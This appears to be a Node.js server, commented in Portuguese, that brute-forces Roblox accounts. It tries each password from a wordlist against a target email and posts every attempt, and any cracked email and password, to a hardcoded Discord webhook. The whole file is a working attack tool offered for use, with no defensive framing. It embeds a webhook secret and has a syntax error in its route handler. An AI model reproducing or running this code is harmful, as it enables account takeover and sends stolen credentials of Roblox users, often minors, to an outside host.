const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const Roblox = require('roblox');

const app = express();
const port = process.env.PORT || 3000;

// URL DO WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

async function sendDiscordMessage(content) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: content,
            username: "Roblox Brute Forcer",
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        });
    } catch (e) {
        console.error("Erro Discord:", e.message);
    }
}

async function tryRobloxLogin(email, password) {
    const roblox = new Roblox();
    
    try {
        // Usar o método de login da biblioteca que trata dos cookies e tokens
        const user = await roblox.users.loginWithUsernamePassword(email, password);
        
        if (user && user.Id) {
            return {
                success: true,
                username: user.Name,
                userId: user.Id
            };
        }
        return { success: false, error: "Resposta vazia" };
    } catch (error) {
        return {
            success: false,
            error: error.message || "Erro Desconhecido"
        };
    }
}

async function startBruteForce(email) {
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        await sendDiscordMessage(`**❌ ERRO:** senhas.txt não encontrado!`);
        return;
    }

    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);

    let found = false;

    for (const password of passwords) {
        if (found) break;

        const result = await tryRobloxLogin(email, password);

        if (result.success) {
            found = true;
            await sendDiscordMessage(`**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.userId}`);
        } else {
            await sendDiscordMessage(`❌ **Falhou:** ${password} | ${result.error}`);
        }

        await new Promise(r => setTimeout(r, 2000));
    }

    if (!found) {
        await sendDiscordMessage(`**❌ FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}`);
    }
}

app.post('/start-brute-force', async (req, res) {
    const { email } = req.body;
    if (!email) return res.json({ error: "Email inválido" });
    
    startBruteForce(email);
    return res.json({ success: true, message: "Ataque iniciado!" });
});

app.listen(port, () => {
    console.log(`✅ Servidor na porta ${port}`);
});
